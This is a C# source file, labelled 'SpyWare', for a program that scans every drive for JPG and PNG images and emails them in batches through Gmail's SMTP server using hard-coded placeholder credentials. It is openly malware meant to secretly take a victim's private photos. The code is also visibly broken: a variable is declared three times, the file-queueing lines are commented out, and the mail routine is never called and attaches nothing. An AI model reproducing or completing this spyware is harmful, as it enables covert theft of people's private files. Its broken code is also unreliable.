using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Mail;
using System.Net;
using System.IO;
using static System.Console;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace SpyWare
{

    class Program
    {
        public static Stack<string> FilesForMessaging = new Stack<string>();
        static void Main(string[] args)
        {

            DriveInfo[] AllDrivers = DriveInfo.GetDrives();
            string[] PathForRootDirectories = AllDrivers.Select(Driver => Driver.Name).ToArray();
            List<string> ListWithAllDirectories = new List<string>();
            List<string> ListWithAllDirectories = new List<string>();
            List<string> ListWithAllDirectories = new List<string>();
            List<string> BlackList = new List<string>();
            for (int i = 0; i < PathForRootDirectories.Length; i++)
            {
                if (AllDrivers[i].IsReady)
                    GetImagesAndSendSms(PathForRootDirectories[i], ListWithAllDirectories, BlackList);
            }

            Console.ReadLine();
        }
        public /*async*/ static void GetImagesAndSendSms(string Path, List<string> AllCatalogs, List<string> BlackList)
        {

            Task.Factory.StartNew(() =>
            {
                Console.ForegroundColor = (ConsoleColor)new Random().Next(1, 15);
              //Название папки где будет ограниченый доступ
              string RestrictedFile = null;
              //Запомним путь, который был прерван из-за какой-то ошибки, чтобы продолжить искать по нём
              string InterruptedPath = null;
                try
                {
                  //Если существует путь по которому мы идем
                  if (Directory.GetDirectories(Path) != null)
                    {
                      //Если в чёрном списке нет данного пути
                      if (!BlackList.Contains(Path))
                        {
                          //Полный путь к папкам
                          string[] Directories = Directory.GetDirectories(Path);
                            foreach (var el in Directories)
                            {
                                if (!BlackList.Contains(el))
                                {
                                    if (!AllCatalogs.Contains(el))
                                    {
                                      //Помещяем текущее название папки как папка с органиченным доступом, чтобы если было исключения то занести эту папку в черный список
                                      //И сохраним путь, который прервался
                                      RestrictedFile = el;
                                        InterruptedPath = Path;
                                        string[] Files = Directory.GetFiles(el);
                                        foreach (var File in Files)
                                        {
                                            if (File.Contains(".jpg") || File.Contains(".png"))
                                            {
                                                Console.WriteLine(File);
                                              #region DoingSmth
                                              //long length = (new FileInfo(File).Length) / 1000;
                                              //  if (length > 100)
                                              ////  {
                                              //      Console.WriteLine("Добавлено в стек");
                                              //      if (FilesForMessaging.Count > 500) Thread.Sleep(500);
                                              //          FilesForMessaging.Push(File);
                                                //}

                                              #endregion
                                          }
                                        }
                                      //Добавляем папку в списко пройденных папко, чтобы ещё раз не заходить в неё
                                      AllCatalogs.Add(el);
                                    }
                                }
                            }
                            foreach (var el in Directories)
                                if (!BlackList.Contains(el))
                                  //Рекурсивно заходим уже  в подпапку папки 
                                  GetImagesAndSendSms(el, AllCatalogs, BlackList);

                        }
                    }
                    else if (Directory.GetParent(Path).FullName != null)
                    {
                        if (!BlackList.Contains(Directory.GetParent(Path).FullName))
                        {
                            BlackList.Add(Path);
                            GetImagesAndSendSms(Directory.GetParent(Path).FullName, AllCatalogs, BlackList);
                        }
                    }
                }
                catch (UnauthorizedAccessException)
                {
                  //Добавляем папку с огрчн доступом в черный список
                  if (RestrictedFile != null)
                    {
                        BlackList.Add(RestrictedFile);
                        GetImagesAndSendSms(InterruptedPath, AllCatalogs, BlackList);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    BlackList.Add(Path);
                    if (Directory.GetParent(Path) != null)
                        GetImagesAndSendSms(Directory.GetParent(Path).FullName, AllCatalogs, BlackList);
                }
            });
        }
        public static MailAddress from = new MailAddress("from@gmail.com", "Send Files");
        public static MailAddress to = new MailAddress("To@gmail.com");
        public static MailMessage message;
        public static SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
        public static void SendMessage(object PhotoFiles)
        {
            while (true)
            {
                CancellationTokenSource source = new CancellationTokenSource();
                Stack<string> Files = (Stack<string>)PhotoFiles;
                if (Files.Count > 10)
                {
                    int AttachFiles = 0;
                    message = new MailMessage(from, to);
                    while (AttachFiles != 10 && Files.Count > 0)
                    {
                        Files.Pop();
                        Console.WriteLine("К-ство файлов в списке" + Files.Count);
                        Console.WriteLine("Удалено с стека");
                        AttachFiles++;
                    }
                    smtp.Credentials = new NetworkCredential("from@gmail.com", "fromParolb");
                    smtp.EnableSsl = true;
                    Task task = smtp.SendMailAsync(message);
                    task.Wait(1000, source.Token);
                    Console.WriteLine(task.Status + "Статус отправки смс");
                    if (task.Status == TaskStatus.Running) source.Cancel();
                }
            }
        }
    }
}



